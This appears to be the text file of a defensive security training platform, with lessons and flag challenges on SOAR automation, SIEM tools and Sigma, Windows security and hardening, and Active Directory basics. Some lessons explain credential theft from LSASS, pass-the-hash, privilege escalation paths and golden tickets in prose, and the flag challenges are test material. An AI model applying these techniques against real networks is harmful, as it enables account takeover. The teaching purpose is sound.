tasks.learn: Approval gate — automate enrichment and low-risk actions fully; gate the irreversible ones behind a human. Speed without recklessness.
tasks.example: Auto: enrich, ticket, block a known-bad external IP. Gated: isolate a production DB server — a human confirms first.

tasks.title: What to automate
tasks.teach: The design rule: automate the repetitive and low-risk; keep humans for judgement. Enrichment, ticketing, and reversible low-impact actions are ideal to automate. Decisions with ambiguity, high impact, or business context — 'is this really malicious?', 'can we take this server down?' — stay human, often behind an approval gate. Over-automation (auto-blocking on a noisy rule) causes outages; under-automation wastes the tool.
tasks.chal: What do you keep human rather than fully automate — the ambiguous, high-impact decisions? Submit TG{•••••••••}.
hints: The part machines are bad at.
tasks.learn: Judgement — automate toil, reserve judgement for people. The best playbooks do the legwork and hand a human a clear, informed decision.
tasks.example: Good split: playbook gathers all evidence and proposes 'isolate WS01?'; the analyst, seeing enriched context, makes the call in one click.

tasks.title: The act step
tasks.teach: The act step is the response — the playbook actually does something via its connectors: block an IOC on the firewall, isolate a host in the EDR, disable an account in AD, quarantine an email, open or update a case. Acts should be logged and, where possible, reversible, so a wrong automated action can be undone.
tasks.chal:
[playbook: phish-triage] step 4 (after approval) -> EDR: quarantine email from all mailboxes (done) -> firewall: block 203.0.113.9 (done) -> case: TG-2026-114 opened, severity High (done)

Which playbook step performs the actual response (block, isolate, quarantine, ticket)? Submit TG{•••}.
tasks.learn: Act — the response, executed through connectors. Log every action and prefer reversible ones so mistakes can be rolled back.
tasks.example: Trigger → enrich → decide → act: the phishing email is pulled from every inbox, the C2 blocked, and a case opened — in seconds, consistently.

lab.intro: Run the phishing playbook and read its actions.

steps.out:
trigger: user report (alert 1042)
enrich: sender_ip MALICIOUS (95%); url=phish; hash 58/70
decide: malicious -> containment branch
act: email quarantined; 203.0.113.9 blocked; case TG-2026-114 opened

steps2: Run (or step through) the phishing playbook in the SOAR
Watch trigger → enrich → decide → act execute
Name the step that performs the response (3 letters).

tasks.title: Guardrails
tasks.teach: Automation that can act on production needs guardrails: error handling (what if a connector fails mid-playbook?), rate limits (don't block 10,000 IPs from one noisy rule), allow/deny lists (never auto-isolate a domain controller), testing in a safe mode first, and approval gates on the dangerous steps. Guardrails are what make automation trustworthy enough to let loose.
tasks.chal: What are the safety controls (error handling, limits, allow-lists, approvals) that make automation safe called? Submit TG{••••••••••}.
hints: Keep automation from causing an outage.
tasks.learn: Guardrails — build them before you let a playbook act on production. Unguarded automation turns one bad rule into a self-inflicted outage.
tasks.example: Guardrail example: the auto-block action skips any IP on the 'critical infrastructure' allow-list and caps at 50 blocks/hour, erroring safely beyond that.

tasks.title: Protect the automation
tasks.teach: A SOAR platform holds the keys to everything it orchestrates — API tokens and credentials for the SIEM, EDR, firewall, AD and cloud. That makes its stored secrets a prime target: steal them and you can act across the whole estate. Protect them with a secrets vault, least-privilege API accounts (only the permissions each playbook needs), rotation, and tight access control on the SOAR itself.
tasks.chal: What high-value items — the API tokens and credentials SOAR stores for every tool — must be most protected? Submit TG{•••••••}.
hints: The keys to every connected tool.
tasks.learn: Secrets — vault them, scope them least-privilege, rotate them. A compromised SOAR with broad creds is an attacker's dream; lock its secrets down.
tasks.example: Least privilege: the phishing playbook's EDR token can quarantine email and isolate hosts — it cannot delete the EDR tenant. Scope every connector.

tasks.title: Scenario: phishing, automated
tasks.teach:
A user reports a phishing email. In Innspark SOAR the playbook triggers, enriches (sender reputation, URL detonation, attachment hash), decides it is malicious, pauses at an approval gate, and on one click acts — quarantines the mail from every inbox, blocks the C2, and opens a case — all in under a minute, consistently, with guardrails. The analyst spent their time on the decision, not the toil. This is what SOAR most improves.

🔑 Key point

MTTR — Mean Time to Respond. Automating enrichment and action collapses minutes-to-hours of manual toil into seconds, while humans keep the judgement.
tasks.chal: Which response-speed metric does SOAR most directly reduce by automating the toil? Submit TG{••••}.
tasks.learn: MTTR — Mean Time to Respond. Automating enrichment and action collapses minutes-to-hours of manual toil into seconds, while humans keep the judgement.
tasks.example: Before SOAR: 25 min of manual phishing triage. After: 40 seconds of automation plus one human decision. That delta, across every alert, is the value.

rooms.title: Splunk, ELK, Wazuh & Sigma
rooms.subtitle: Learn the big SIEM/EDR tools side by side — then write detections once in Sigma.
rooms.blurb: Search in Splunk and Kibana, deploy a Wazuh agent, and write a Sigma rule that converts to every platform.

tasks.title: Four tools, one goal
tasks.teach: A SOC's day-to-day runs on a handful of platforms, and these four are the ones you will meet most. Splunk and the Elastic Stack (ELK) are powerful SIEM/analytics platforms. Wazuh is a free, open security platform with host agents (SIEM + EDR-ish). And Sigma is the glue that solves a real problem: detections written for one platform don't run on another. Sigma is a generic, platform-agnostic detection format — you write once in Sigma and convert it to run on any of them.
tasks.chal: Which of the four is the write-once, platform-agnostic detection format that converts to the others? Submit TG{•••••}.
tasks.learn: Sigma — the portable detection language. Write a rule once, convert it to Splunk, ELK or Wazuh; share and reuse community rules.
tasks.example: Without Sigma, a SQLi detection is rewritten three times for three tools. With Sigma, it is written once and compiled to each.

tasks.title: Splunk
tasks.teach: Splunk ingests data through forwarders, stores it in indexers, and is queried via search heads. Its query language is SPL (Search Processing Language) — a pipeline where you pipe (|) data through commands: search, then stats to aggregate, then where/table to filter and shape. SPL fluency is a core SOC skill.
tasks.chal:
index=wineventlog EventCode=4625 | stats count by Account_Name, Source_Network_Address | where count > 10

What is Splunk's search/query language called? Submit TG{•••}.
hints: Search Processing Language; it uses pipes.
tasks.learn: SPL — pipe data through commands. The example counts failed logons by account and source and filters to likely brute force.
tasks.example: Mental model: search ... | stats ... | where ... reads left to right, each | passing results to the next command — like a shell pipeline.

lab.intro: Run an SPL search for brute-force sources in Splunk.

steps.cmd: index=wineventlog EventCode=4625 | stats count by Account_Name Source_Network_Address | where count>10
steps.out:
Account_Name  Source_Network_Address  count
rnehra        203.0.113.9             47
admin         203.0.113.9             31

sugg: index=wineventlog EventCode=4625 | stats count by Account_Name Source_Network_Address | where count>10

steps2: In Splunk search failed logons (EventCode 4625)
Pipe to stats count by account and source, filter count>10
Name Splunk’s query language (3 letters).

tasks.title: ELK — the Elastic Stack
tasks.teach: The Elastic Stack (ELK) is four parts in a pipeline: Beats (lightweight shippers on hosts) and/or Logstash (collect and transform) feed Elasticsearch (the search/storage engine), which you explore and visualise in Kibana (the UI, including the Security app). Data flows Beats/Logstash → Elasticsearch → Kibana; you query with KQL or the query DSL.
tasks.chal: Which ELK component is the UI you search and build dashboards in? Submit TG{••••••}.
tasks.learn: Kibana — the window into Elasticsearch. Beats/Logstash collect, Elasticsearch stores and searches, Kibana visualises.
tasks.example: Flow: Winlogbeat on DC01 → Logstash (parse) → Elasticsearch (index) → Kibana (a dashboard of failed logons by source).

tasks.title: Wazuh
tasks.teach: Wazuh is a free, open security platform: a lightweight agent on each endpoint ships telemetry to a manager, which uses decoders (parse the log) and rules (match and score) to alert, with an indexer and dashboard on top. Beyond log analysis it does File Integrity Monitoring (FIM) and Security Configuration Assessment (SCA) — making it SIEM-plus-host-security in one.
tasks.chal:
$ /var/ossec/bin/agent_control -l ID: 001 Name: WS01 IP: 10.10.10.21 Status: Active ID: 002 Name: DC01 IP: 10.10.10.10 Status: Active

What is the lightweight component installed on each endpoint to ship telemetry to the Wazuh manager? Submit TG{•••••}.
tasks.learn: Agent — on each host; the manager decodes and runs rules. Wazuh also gives you FIM and configuration assessment out of the box.
tasks.example: Install: WAZUH_MANAGER=10.10.10.40 apt install wazuh-agent then enable it — the host now reports to the manager.

lab.intro: Confirm the Wazuh agents are connected to the manager.

steps.out:
ID:001 Name:WS01 IP:10.10.10.21 Status:Active
ID:002 Name:DC01 IP:10.10.10.10 Status:Active
ID:003 Name:LNX01 IP:10.10.10.30 Status:Active

steps2: On the manager: /var/ossec/bin/agent_control -l
Confirm each endpoint shows Active
Name the component installed on the endpoints.

tasks.title: Sigma rule structure
tasks.teach: A Sigma rule is simple YAML with three key parts: logsource (which kind of log it applies to), detection (the match logic — one or more selections plus a condition combining them), and metadata (title, level, ATT&CK tags). The detection block is the heart: it says exactly what fields and values to match.
tasks.chal:
title: Windows Failed Logon Burst logsource: { product: windows, service: security } detection: selection: { EventID: 4625 } condition: selection | count() by Account > 10 level: medium

Which YAML section of a Sigma rule holds the match logic (selection + condition)? Submit TG{•••••••••}.
tasks.learn: detection — the match logic. logsource scopes it; detection defines the selection(s) and the condition that fires.
tasks.example: Read it: 'in Windows security logs, where EventID 4625 occurs more than 10 times per account, fire a medium alert.' Portable to any backend.

tasks.title: Write once, run anywhere
tasks.teach: Sigma's whole value is conversion. A converter (sigma-cli / pySigma) compiles one Sigma rule into each platform's native query — SPL for Splunk, KQL/DSL for ELK, a rule for Wazuh. You maintain one rule; every platform gets the current version. The tagline is literal: write once in Sigma, run anywhere.
tasks.chal:
$ sigma convert -t splunk failed_logon_burst.yml index=* EventID=4625 | stats count by Account | where count > 10 $ sigma convert -t elasticsearch failed_logon_burst.yml EventID:4625 (then aggregate in Kibana)

Write once in Sigma, run ___? Submit the missing word as TG{••••••••}.
tasks.learn: Anywhere — one rule compiled to Splunk, ELK and Wazuh. Fix the detection once and redeploy everywhere; no triple maintenance.
tasks.example: Migrate from Splunk to ELK next year? Your Sigma library just recompiles — the detections move with you.

tasks.title: Reading results
tasks.teach: Across all these tools, turning raw matches into insight means aggregation. In Splunk the command is stats (count/sum/avg, grouped by fields); ELK has aggregations; Wazuh groups by rule. Aggregation is how 10,000 raw events become 'top 5 sources of failed logons' — a table you can act on, and the basis of every dashboard.
tasks.chal: Which Splunk command aggregates events (count/sum grouped by a field)? Submit TG{•••••}.
tasks.learn: stats — the workhorse aggregation in SPL. Aggregation turns a flood of events into the handful of rows that matter.
tasks.example: ... | stats count by src_ip | sort -count | head 5 → the five noisiest sources, instantly — a dashboard panel in one line.

tasks.title: File Integrity Monitoring
tasks.teach: A Wazuh capability worth knowing by name: FIM — File Integrity Monitoring. The agent watches critical files and directories and alerts when they are created, modified or deleted — by comparing cryptographic hashes against a baseline. It catches web-shell drops, tampering with system binaries, and changes to config files that signatures would miss.
tasks.chal: What is the Wazuh feature that alerts on changes to watched files (by hashing against a baseline)? Submit TG{•••}.
tasks.learn: FIM — hashes files and alerts on change. A new .php appearing in a web root, or a modified /etc/passwd, raises an alert.
tasks.example: FIM catches the Altered-Payroll-File style tamper and the web-shell drop — the integrity half of CIA, enforced on the endpoint.

lab.intro: Check Wazuh FIM alerts for an unexpected file change.

steps.out: File '/var/www/html/up.php' added. sha256 changed. agent=WS01 (web root)  <- possible web shell

steps2: On Wazuh, review syscheck (FIM) alerts
A new file in the web root with a new hash = suspicious
Name this file-watching feature (3 letters).

tasks.title: Detection-as-code
tasks.teach: Treating detections like software is detection-as-code: Sigma rules live in version control (Git), are peer-reviewed, tested against sample data, and deployed through a pipeline to Splunk/ELK/Wazuh. You get history, rollback, collaboration and consistency — the same engineering rigour code gets, applied to your detections. It is how mature SOCs manage coverage at scale.
tasks.chal: Managing detections in version control, reviewed and tested like software, is called ___ (three words)? Submit TG{•••••••••_••_••••}.
hints: Rules in Git, tested and deployed.
tasks.learn: Detection-as-code — Sigma + Git + CI. Review, test and deploy detections like software; map coverage to ATT&CK and never lose a rule's history.
tasks.example: Workflow: write Sigma → PR + review → test on sample logs → merge → pipeline converts and deploys to all three platforms.

tasks.title: Scenario: one rule, three platforms
tasks.teach:
A new attack technique appears. The detection engineer writes one Sigma rule, tests it, and the pipeline converts and deploys it to Splunk, ELK and Wazuh at once — all three now catch the same attack, with no rule rewritten three times. If the org later swaps platforms, the Sigma library moves with them. That single property is why Sigma sits at the centre of a modern tool stack.

🔑 Key point

Portability — write once, run anywhere, and never be locked to one vendor's query language. Sigma + detection-as-code is the modern detection workflow.
tasks.chal: What single property lets one Sigma rule run across Splunk, ELK and Wazuh (and survive a platform change)? Submit TG{•••••••••••}.
tasks.learn: Portability — write once, run anywhere, and never be locked to one vendor's query language. Sigma + detection-as-code is the modern detection workflow.
tasks.example: The payoff: coverage that is vendor-independent. Your detections are an asset you own, not rules trapped inside one product.

rooms.title: Windows Security
rooms.subtitle: Identities, tokens, permissions, authentication and the modern defences.
rooms.blurb: Read SIDs and tokens, DACLs and privileges, NTLM/Kerberos and the logs, and enable the protections that stop credential theft.

tasks.title: The Windows security model
tasks.teach:
Every security decision in Windows comes down to one check: does this access token have the rights to do this to this securable object? When you log on, the LSASS process authenticates you and builds your access token — your 'badge', carrying your user SID, your group SIDs, your privileges, and your integrity level. Every object (file, registry key, service, process) has a security descriptor with a DACL listing who may do what. The kernel's Security Reference Monitor (SRM) compares token to DACL and answers yes or no.

Why it matters: token-vs-object is the whole model. Attackers steal tokens, add privileges, or raise their integrity level precisely because the token is what the system trusts. Understand the token and you understand both access control and most Windows attacks.
tasks.chal: What is the 'badge' built at logon that carries your SIDs, privileges and integrity level? Submit TG{••••••_•••••}.
hints: What the SRM checks against an object's DACL.
tasks.learn: Access token — SIDs + privileges + integrity level. The SRM checks it against each object's DACL. Token vs object is the entire model.
tasks.example: Run as admin vs not: same user, different token (one has elevated privileges and a higher integrity level). The object didn't change — your token did.

tasks.title: SIDs
tasks.teach: Windows does not identify principals by name — names are just friendly labels. The real identity is the SID (Security Identifier), a unique number like S-1-5-21-...-1001. Rename a user and the SID stays; that is why permissions survive renames. Some well-known SIDs are worth knowing: S-1-5-18 (SYSTEM), S-1-5-32-544 (Administrators), S-1-1-0 (Everyone), and the RID 500 account is always the built-in Administrator.
tasks.chal:
C:\> whoami /user USER INFORMATION User Name SID ============= ============================================= tg\rnehra S-1-5-21-3623811015-3361044348-30300820-1113

What is the unique number that actually identifies a Windows principal (names are only labels)? Submit TG{•••}.
tasks.learn: SID — the true identity. The ...-500 RID is always the built-in Administrator; well-known SIDs identify SYSTEM, Administrators and Everyone.
tasks.example: An attacker who sees a logon by the ...-500 account knows it is the built-in Administrator, whatever it has been renamed to.

lab.intro: Read your own SID and token groups.
steps2: Open cmd and run whoami /user (and whoami /groups)
Note the SID identifies you, not your name
Name this identifier (3 letters).

tasks.title: Where credentials live
tasks.teach: Windows authenticates with two protocols: NTLM (older challenge-response, hash-based) and Kerberos (ticket-based, the default in a domain). Both rely on secrets held in memory by the LSASS process (Local Security Authority Subsystem Service) — password hashes, Kerberos tickets, and cached credentials. That is why LSASS is the number-one target: dump its memory and you harvest everyone's credentials who logged on to that machine.
tasks.chal: Which process holds credential secrets (hashes, tickets) in memory and is the prime theft target? Submit TG{•••••}.
tasks.learn: LSASS — where credentials live in memory. Protecting it (Credential Guard, LSA protection) is central to stopping credential theft.
tasks.example: Tools like Mimikatz read LSASS memory to pull NTLM hashes and Kerberos tickets — no password cracking needed. Hence Credential Guard isolates it.

tasks.title: Read the Security log
tasks.teach: The Windows Security event log is your record of who did what. A few IDs are essential: 4624 (successful logon), 4625 (failed logon), 4688 (new process created — with the command line if enabled), 4720 (a user account was created). Each 4624 also carries a logon type — type 2 (interactive), 3 (network), 10 (RDP) — which tells you how they logged on.
tasks.chal:
Event 4624 An account was successfully logged on. Account Name: rnehra Logon Type: 10 (RemoteInteractive / RDP) Source Address: 10.10.10.50

Which Windows Event ID records a successful logon? Submit TG{••••}.
tasks.learn: 4624 — successful logon (read its Logon Type to see how). 4625 failed, 4688 process create, 4720 account created.
tasks.example: Logon Type 10 from an unexpected source IP on a server at 3am is a classic 'investigate this RDP' signal.

lab.intro: Find successful logons and their logon type.

steps.out:
TimeCreated   Id   Message
09:14:02      4624 Logon Type 10 (RDP)  Account: rnehra  Source: 10.10.10.50
09:02:11      4624 Logon Type 2  (interactive) Account: svc_sql

steps2: In PowerShell query Security log for Id 4624
Read the Logon Type and source
Submit the Event ID for a successful logon.

tasks.title: Permissions: the DACL
tasks.teach: Every securable object has a DACL (Discretionary Access Control List) — a list of ACEs (access control entries) saying which SID is allowed or denied which rights. You read and set file DACLs with icacls. A SACL is the other half of the security descriptor: it defines auditing (which access attempts get logged). Misconfigured DACLs — a sensitive file writable by Everyone — are a common privilege-escalation path.
tasks.chal:
C:\> icacls C:\Apps\config.ini C:\Apps\config.ini BUILTIN\Administrators:(F) NT AUTHORITY\SYSTEM:(F) BUILTIN\Users:(RX) Everyone:(M) <- Everyone can Modify! weak

What is the list of allow/deny permissions on a Windows object called? Submit TG{••••}.
tasks.learn: DACL — the permission list (ACEs). Read it with icacls; the SACL is the auditing list. Everyone:(M) on a config file is a finding.
tasks.example: Priv-esc via DACL: a service binary writable by standard users → replace it → it runs as SYSTEM. Always check icacls on service paths.

lab.intro: Inspect a file's permissions for a weak entry.

steps.out:
C:\Apps\config.ini BUILTIN\Administrators:(F)
                    BUILTIN\Users:(RX)
                    Everyone:(M)   <- weak: Everyone can modify

steps2: Run icacls <path> on a sensitive file
Look for over-broad entries (Everyone/Users with write/modify)
Name this permission list (4 letters).

tasks.title: Privileges
tasks.teach: Separate from object permissions, an access token carries privileges — system-wide rights like 'back up files' or 'debug programs'. Some are dangerous enough to equal full compromise. SeDebugPrivilege lets a holder open any process — including LSASS — so it is effectively a key to all credentials. Others (SeImpersonate, SeBackup, SeTakeOwnership) are classic privilege-escalation primitives. You list your privileges with whoami /priv.
tasks.chal:
C:\> whoami /priv Privilege Name State ========================== ======== SeDebugPrivilege Enabled <- can open any process, incl. LSASS SeImpersonatePrivilege Enabled

Which privilege lets its holder open any process (including LSASS) and is effectively a key to all credentials? Submit TG{••••••••••••••••}.
tasks.learn: SeDebugPrivilege — grants access to any process's memory. Grant it to almost no one; its presence on a token is a red flag.
tasks.example: SeImpersonate on a service account powers the 'Potato' escalations to SYSTEM; SeBackup can read any file bypassing DACLs. Privileges can beat permissions.

lab.intro: List the privileges on your token.

steps.out:
SeDebugPrivilege        Enabled   <- dangerous
SeImpersonatePrivilege  Enabled
SeChangeNotifyPrivilege Enabled

steps2: Run whoami /priv
Spot the privilege that can open any process
Submit its full name.

tasks.title: UAC & integrity levels
tasks.teach: Even an administrator normally runs with a filtered standard token; UAC (User Account Control) is the prompt that lets them raise to their full admin token for a specific action. This ties to integrity levels (Low / Medium / High / System) — a lower-integrity process cannot write to a higher-integrity object. UAC is a convenience boundary, not a strong security boundary, but it stops a lot of casual and malware escalation.
tasks.chal: What Windows feature prompts an admin to consent before running an action with full privileges? Submit TG{•••}.
tasks.learn: UAC — admins run filtered until they elevate. Paired with integrity levels, it blocks silent escalation; attackers seek 'UAC bypasses' precisely because of it.
tasks.example: A Medium-integrity process (your normal apps) can't tamper with a High-integrity one; malware that lands Medium must find a bypass to go High.

tasks.title: Credential theft: pass-the-hash
tasks.teach: Windows' biggest weakness historically is credential reuse. NTLM authenticates with the password hash, not the password — so an attacker who dumps a hash from LSASS can authenticate as that user without ever cracking it. This is pass-the-hash: the stolen hash is the password for all practical purposes. The Kerberos equivalent is pass-the-ticket. This is how a single compromised host becomes domain-wide lateral movement.
tasks.chal: Reusing a stolen NTLM hash to authenticate without cracking it is called ___ (three words)? Submit TG{••••_•••_••••}.
tasks.learn: Pass-the-hash — the NTLM hash authenticates directly. Defences: Credential Guard, LSA protection, no admin reuse across hosts, and LAPS.
tasks.example: Admin logs onto 50 machines → their hash sits in 50 LSASS stores → one compromised host hands the attacker admin on all 50. Hence no credential reuse.

tasks.title: Modern defences
tasks.teach: Windows 10/11 and Server ship strong, often-disabled protections. Credential Guard uses virtualisation-based security (VBS) to isolate LSASS secrets in a separate container the OS itself can't read — defeating most credential dumping. ASR (Attack Surface Reduction) rules block risky behaviours (Office spawning children, credential theft APIs). WDAC/AppLocker control which code may run. LSA protection makes LSASS a protected process. Turning these on is high-value, low-cost defence.
tasks.chal: Which VBS feature isolates LSASS secrets so credential-dumping tools can't read them? Submit TG{••••••••••_•••••}.
hints: Isolates credentials in a VBS container.
tasks.learn: Credential Guard — isolates LSASS secrets with virtualisation-based security, breaking pass-the-hash harvesting. Pair with ASR, WDAC and LSA protection.
tasks.example: With Credential Guard on, a Mimikatz LSASS dump returns no usable hashes — the secrets live where the normal OS (and the attacker) cannot reach.

tasks.title: Scenario: phishing to privilege
tasks.teach:
Phishing lands on a Windows desktop. The attacker now wants three things in order: Windows credentials (dump LSASS), Windows privilege (abuse a token privilege or UAC bypass to go SYSTEM), and lateral movement (pass-the-hash to the next host). Every step abuses the token model. The single control that most limits how far any one stolen token reaches is a familiar principle.

🔑 Key point

Least privilege — standard users, separated admin, no credential reuse. Combined with Credential Guard and logging, it turns a foothold into a dead end.
tasks.chal: Which principle most limits the damage of any single stolen token or compromised account? Submit TG{•••••_•••••••••}.
hints: Give each account only what it needs.
tasks.learn: Least privilege — standard users, separated admin, no credential reuse. Combined with Credential Guard and logging, it turns a foothold into a dead end.
tasks.example: If the phished user is standard (not local admin) and admins never log onto workstations, the attacker's first two steps fail — the chain breaks early.

rooms.title: Windows Hardening
rooms.subtitle: Shrink the attack surface, hold the baseline, measure the drift.
rooms.blurb: Apply a CIS/Microsoft baseline, reduce attack surface, fix accounts with LAPS, enforce by GPO and measure compliance.

tasks.title: What hardening is
tasks.teach:
Hardening is reducing a system's attack surface — all the ways it could be attacked: running services, open ports, enabled features, installed software, accounts and protocols. The mindset is subtraction: a secure system is not one with more security products bolted on, but one with everything unnecessary removed and everything remaining configured safely. Less surface means fewer things to exploit, patch and watch.

Why it matters: most breaches exploit something that didn't need to be there — SMBv1 still enabled, a service nobody uses, a local admin account with a shared password. Hardening is a deploy-to-practice discipline, not a pile of registry tweaks copied from a forum.
tasks.chal: What is the term for all the ways a system could be attacked (services, ports, features, accounts)? Submit TG{••••••_•••••••}.
tasks.learn: Attack surface — hardening shrinks it. Every service, port and account you remove is one less thing to exploit, patch or monitor.
tasks.example: A default Windows Server runs dozens of services; a hardened file server runs the handful it needs. Same role, a fraction of the surface.

tasks.title: The subtraction mindset
tasks.teach: The core discipline of hardening is subtraction — remove, disable, restrict — rather than addition. You do not make a box secure by installing more tools; you make it secure by taking away everything it does not need and locking down what is left. 'What can I turn off?' is a more powerful security question than 'what can I add?'
tasks.chal: What one-word mindset defines hardening — removing and disabling rather than adding? Submit TG{•••••••••••}.
tasks.learn: Subtraction — the hardening mindset. Fewer features, services and accounts is more secure than more security software on a bloated system.
tasks.example: Add an EDR to a box running SMBv1, Telnet and five unused services, and you are watching an attack surface you could have deleted for free.

tasks.title: Baselines & benchmarks
tasks.teach: You don't invent 'secure' from scratch — you measure against a baseline, a defined set of secure settings. Published baselines are benchmarks: the CIS Benchmarks (community, with specific numbered recommendations), Microsoft Security Baselines (shipped as GPOs via the Security Compliance Toolkit), and STIGs (US DoD). You pick one, apply it, and then measure compliance against it — the baseline becomes your definition of 'secure' that you can keep proving you meet.
tasks.chal: Name the widely-used community benchmark with specific numbered hardening recommendations. Submit TG{•••}.
tasks.learn: CIS Benchmarks — concrete, numbered settings per platform. Microsoft Security Baselines and STIGs are the other common choices.
tasks.example: CIS gives you 'set this registry value, disable that service' with a rationale for each — a checklist you can audit, not guesswork.

tasks.title: Compliance & drift
tasks.teach: Hardening is not one-and-done. Compliance is how well a system matches its baseline right now; drift is the gradual divergence from it over time as admins make changes, software installs settings, and exceptions pile up. You harden once, then continuously scan for drift and pull systems back into line — because a baseline you set and never re-check is a baseline you no longer meet.
tasks.chal:
$ compliance-scan --baseline CIS-Win11 --host WS01 Compliant: 182 / 195 controls (93%) Changed since last scan: 1.2.1 SMBv1 disabled -> FAIL (re-enabled!) 2.3.1 Local admin renamed -> FAIL

What is the gradual divergence of a system away from its baseline over time called? Submit TG{•••••}.
tasks.learn: Drift — scan for it continuously. A 93%-compliant box that was 100% last month has drifted; find and fix the two failed controls.
tasks.example: SMBv1 'came back' because an app installer re-enabled it — exactly the kind of drift a scheduled compliance scan catches before an attacker does.

lab.intro: Scan a host against the baseline and read the drift.

steps.out:
Compliant: 182/195 (93%)
Drift:
 1.2.1 SMBv1 disabled -> FAIL (re-enabled)
 2.3.1 Local admin renamed -> FAIL

steps2: Run a compliance scan against your baseline (CIS/MSFT)
Review which controls now FAIL vs last scan
Name this divergence from the baseline.

tasks.title: Reduce the attack surface
tasks.teach: The highest-value subtraction is removing legacy and unused components. The classic offender is SMBv1 — the ancient file-sharing protocol exploited by WannaCry/EternalBlue; it should be disabled everywhere. Likewise: turn off unused Windows features and services, close unneeded ports, remove software you don't use, and disable weak protocols and ciphers.
tasks.chal:
PS> Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol FeatureName : SMB1Protocol State : Enabled <- disable this PS> Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

Which legacy file-sharing protocol (exploited by EternalBlue/WannaCry) must be disabled? Submit TG{•••••}.
tasks.learn: SMBv1 — disable it everywhere. It is the poster child for 'legacy protocol still enabled' and a favourite of worms and ransomware.
tasks.example: One command removes a whole class of remote exploits. That is the subtraction mindset paying off: delete the surface, delete the risk.

lab.intro: Check whether the SMBv1 legacy protocol is still enabled.

steps.out:
FeatureName : SMB1Protocol
State       : Enabled      <- should be Disabled

steps2: Check the feature state in PowerShell
If Enabled, disable it with Disable-WindowsOptionalFeature
Name this legacy protocol (name + version).

tasks.title: Fix the accounts
tasks.teach: Account hygiene is core hardening. Users should be standard, not local administrators (least privilege). A strong password and lockout policy stops guessing. And the single most dangerous pattern — the same local administrator password on every machine — must be fixed, because one dumped hash then unlocks the whole fleet by pass-the-hash.
tasks.chal: What principle says users should run as standard accounts with admin rights separated and minimal? Submit TG{•••••_•••••••••}.
tasks.learn: Least privilege — standard users, separated admin, minimal rights. It shrinks what any compromised account can do.
tasks.example: First-user-is-admin is the default trap. Make daily accounts standard and give admins a separate, non-email, non-browsing admin account.

tasks.title: Unique local-admin passwords (LAPS)
tasks.teach: The fix for the shared-local-admin-password problem is LAPS (Local Administrator Password Solution): Microsoft's tool that sets a unique, random local-admin password on every machine, rotates it automatically, and stores it securely in Active Directory where only authorised admins can read it. With LAPS, dumping one machine's local admin hash gets the attacker exactly that one machine — the lateral-movement chain is cut.
tasks.chal: Which Microsoft solution gives every machine a unique, auto-rotated local administrator password? Submit TG{••••}.
tasks.learn: LAPS — unique per-machine local admin passwords, rotated and vaulted in AD. It single-handedly breaks local-admin pass-the-hash across a fleet.
tasks.example: Before LAPS: one password on 5,000 PCs → one hash = 5,000 admins. After LAPS: 5,000 unique passwords → one hash = one PC.

tasks.title: Encrypt the disk (BitLocker)
tasks.teach: Hardening covers data at rest too. BitLocker is Windows' full-disk encryption; with a TPM it transparently encrypts the drive so a stolen or decommissioned laptop/disk reveals nothing. It protects confidentiality against physical theft and offline attacks (booting another OS to read the disk or dump the SAM).
tasks.chal: What is Windows' built-in full-disk encryption feature? Submit TG{•••••••••}.
tasks.learn: BitLocker — full-disk encryption, usually TPM-backed. A lost laptop becomes a brick to the thief instead of a data breach.
tasks.example: Without it, a thief boots a Linux USB and copies your files or the SAM. With BitLocker, the disk is unreadable without the key.

tasks.title: Audit policy & exceptions
tasks.teach: You cannot prove hardening without logging: enable advanced audit policy (logon events, process creation with command line, object access), set sensible log sizes, and forward logs off-host so an attacker can't erase them. And because no fleet is 100% uniform, you manage deviations formally: an exception is a documented, approved deviation from the baseline — not a silent one — with an owner and a review date.
tasks.chal: What is a documented, approved deviation from the hardening baseline called? Submit TG{•••••••••}.
tasks.learn: Exception — the controlled way to deviate. Documented, owned and reviewed, so your compliance number stays honest and auditable.
tasks.example: 'App X needs SMBv1 until Q2' is an exception with an owner and expiry — very different from SMBv1 silently drifting back on.

tasks.title: Scenario: harden a fleet without breaking it
tasks.teach: Hardening one machine by hand is easy; doing it to thousands without breaking apps is the real skill. The pattern: pick a baseline, test it in audit/report mode, roll it out in waves via Group Policy (GPO) (the fleet-wide enforcement mechanism in a domain), watch for broken apps, record exceptions, and continuously scan for drift. GPO is how 'we hardened a laptop' becomes 'we enforce the baseline on every domain machine'.
tasks.chal: What domain mechanism enforces hardening settings consistently across an entire fleet? Submit TG{•••}.
tasks.learn: GPO — Group Policy enforces the baseline fleet-wide and re-applies it, fighting drift automatically. Test in waves; keep a rollback.
tasks.example: Microsoft Security Baselines ship as GPOs for exactly this — import, test on a pilot OU, then roll out and monitor compliance.

rooms.title: Active Directory Security
rooms.subtitle: From one phished user to Domain Admin — the path, and where it is cut.
rooms.blurb: Understand AD and Kerberos, recognise Kerberoasting/DCSync/golden tickets, and apply the tiered-admin model.

tasks.title: What Active Directory is
tasks.teach:
Active Directory (AD) is the directory service at the heart of almost every Windows network — a central database of users, computers, groups and policy. It runs on Domain Controllers (DCs) (Windows Servers) and is organised into a forest (the top-level security boundary) containing domains, subdivided into OUs (Organisational Units) for structure and policy. Core protocols: Kerberos (authentication), LDAP (directory queries), DNS, and SMB (for SYSVOL/GPO).

Why it matters: AD is the keys to the kingdom — compromise it and you own every user and machine. The 'crown jewels' are the Domain Admins group, the krbtgt account, and the DCs themselves. Attackers aim straight for them.
tasks.chal: Which server role hosts Active Directory and authenticates the domain? Submit TG{••••••_••••••••••}.
tasks.learn: Domain Controller — runs AD, Kerberos and LDAP. Own a DC and you own the domain; protecting DCs is the top AD priority.
tasks.example: Forest > domain > OU is the structure. The forest is the real security boundary — trust across forests is where many attacks and mistakes live.

tasks.title: Kerberos & krbtgt
tasks.teach: AD authenticates with Kerberos, a ticket system. One account underpins all of it: krbtgt, whose password hash is used to sign and encrypt every TGT (Ticket Granting Ticket) in the domain. Because krbtgt signs all tickets, an attacker who steals its hash can forge tickets for anyone, forever — a 'golden ticket'. That is why krbtgt is a crown jewel and why resetting it (twice) is a key recovery step after domain compromise.
tasks.chal: Which AD account's hash signs every Kerberos TGT — making it the key to forging tickets? Submit TG{••••••}.
tasks.learn: krbtgt — the ticket-signing account. Its hash = the ability to forge any ticket (golden ticket). Protect it; reset it twice after compromise.
tasks.example: Steal krbtgt's hash once and you can mint valid admin tickets even after passwords change — which is why its compromise is a domain-rebuild event.

